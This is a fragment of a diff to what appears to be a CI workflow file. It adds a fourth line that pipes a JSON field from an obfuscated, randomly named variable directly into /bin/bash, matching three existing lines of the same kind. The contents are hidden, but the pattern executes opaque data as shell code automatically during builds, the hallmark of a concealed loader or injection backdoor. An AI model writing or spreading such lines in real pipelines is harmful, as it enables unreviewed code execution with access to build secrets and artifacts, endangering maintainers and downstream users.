@@ -32,6 +32,7 @@ jobs:
           echo $gqhl03830 | jq -r .r77 | /bin/bash
           printf '%s' "$v799" | jq -r .zae5 | /bin/bash
           echo $wh785 | jq -r .wysa6837 | /bin/bash
+          echo $q13099 | jq -r .t7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
